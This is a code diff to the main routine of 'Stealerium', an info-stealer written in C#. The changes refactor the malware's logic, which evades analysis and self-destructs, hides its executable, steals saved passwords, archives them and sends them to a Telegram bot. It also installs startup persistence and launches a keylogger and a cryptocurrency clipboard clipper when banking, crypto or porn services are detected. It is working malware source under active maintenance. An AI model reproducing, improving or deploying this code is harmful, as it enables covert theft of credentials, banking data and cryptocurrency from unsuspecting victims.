@@ -16,73 +16,65 @@ namespace Stealerium
         [STAThread]
         private static async Task Main()
         {
-            Thread
-                wThread = null,
-                cThread = null;
+            Thread wThread = null, cThread = null;
 
-            // SSL
+            // SSL setup
             ServicePointManager.Expect100Continue = true;
             ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
             ServicePointManager.DefaultConnectionLimit = 9999;
 
-            // Mutex check
+            // Run AntiAnalysis modules first
+            if (await AntiAnalysis.RunAsync().ConfigureAwait(false))
+            {
+                Logging.Log("AntiAnalysis: Detected suspicious environment. Initiating self-destruct.");
+                SelfDestruct.Melt();
+            }
+
+            // Mutex check (to avoid running multiple instances)
             MutexControl.Check();
+
+            // Initialize configuration
+            Config.Init();
 
             // Hide executable on first start
             if (!Startup.IsFromStartup())
                 Startup.HideFile();
 
-            // If Telegram API or ID not exists => Self destruct.
+            // If Telegram API or ID is invalid, self-destruct
             if (Config.TelegramAPI.Contains("---") || Config.TelegramID.Contains("---"))
             {
                 Logging.Log("SelfDestruct triggered because Telegram API or Telegram ID is invalid.");
                 SelfDestruct.Melt();
             }
-            else
-            {
-                Logging.Log("Telegram API and ID are valid. SelfDestruct was not triggered.");
-            }
 
-            // Start delay
+            // Start delay (if configured)
             if (Config.StartDelay == "1")
                 StartDelay.Run();
-
-            // Run AntiAnalysis modules
-            if (await AntiAnalysis.RunAsync().ConfigureAwait(false))
-                AntiAnalysis.FakeErrorMessage();
-
 
             // Change working directory to appdata
             Directory.SetCurrentDirectory(Paths.InitWorkDir());
 
-            // Decrypt config strings
-            Config.Init();
-
-            // Test telegram API token
+            // Test Telegram API token
             if (!await Telegram.TokenIsValidAsync().ConfigureAwait(false))
             {
                 Logging.Log("SelfDestruct triggered because the Telegram API token is invalid.");
                 SelfDestruct.Melt();
             }
-            else
-            {
-                Logging.Log("Telegram API token is valid. SelfDestruct was not triggered.");
-            }
 
-            // Steal passwords
+            // Steal passwords and send the report
             var passwords = Passwords.Save();
-            // Compress directory
             var archive = Filemanager.CreateArchive(passwords);
-            // Send archive
             await Telegram.SendReportAsync(archive).ConfigureAwait(false);
 
-            // Install to startup if enabled in config and not installed
-            if (Config.Autorun == "1" && (Counter.BankingServices || Counter.CryptoServices || Counter.PornServices))
-                if (!Startup.IsInstalled() && !Startup.IsFromStartup())
+            // Install to startup if necessary and not already installed
+            if (Config.Autorun == "1" && !Startup.IsInstalled() && (Counter.BankingServices || Counter.CryptoServices || Counter.PornServices))
+            {
+                if (!Startup.IsFromStartup())
                     Startup.Install();
+            }
 
-            // Run keylogger module
-            if (Config.KeyloggerModule == "1" && (Counter.BankingServices || Counter.Telegram) && Config.Autorun == "1")
+            // Run keylogger module if necessary
+            if (Config.KeyloggerModule == "1" && Config.Autorun == "1" && (Counter.BankingServices || Counter.Telegram))
             {
                 Logging.Log("Starting keylogger modules...");
                 wThread = WindowManager.MainThread;
@@ -90,8 +82,8 @@ namespace Stealerium
                 wThread.Start();
             }
 
-            // Run clipper module
-            if (Config.ClipperModule == "1" && Counter.CryptoServices && Config.Autorun == "1")
+            // Run clipper module if necessary
+            if (Config.ClipperModule == "1" && Config.Autorun == "1" && Counter.CryptoServices)
             {
                 Logging.Log("Starting clipper modules...");
                 cThread = ClipboardManager.MainThread;
@@ -99,23 +91,17 @@ namespace Stealerium
                 cThread.Start();
             }
 
-            // Wait threads
-            if (wThread != null)
-                if (wThread.IsAlive)
-                    wThread.Join();
-            if (wThread != null)
-                if (cThread.IsAlive)
-                    cThread.Join();
+            // Wait for threads to finish
+            if (wThread != null && wThread.IsAlive)
+                wThread.Join();
+            if (cThread != null && cThread.IsAlive)
+                cThread.Join();
 
-            // Remove executable if running not from startup directory
+            // Self-destruct if not running from startup
             if (!Startup.IsFromStartup())
             {
                 Logging.Log("SelfDestruct triggered because the program was not started from startup.");
                 SelfDestruct.Melt();
-            }
-            else
-            {
-                Logging.Log("Program started from startup. SelfDestruct was not triggered.");
             }
         }
     }
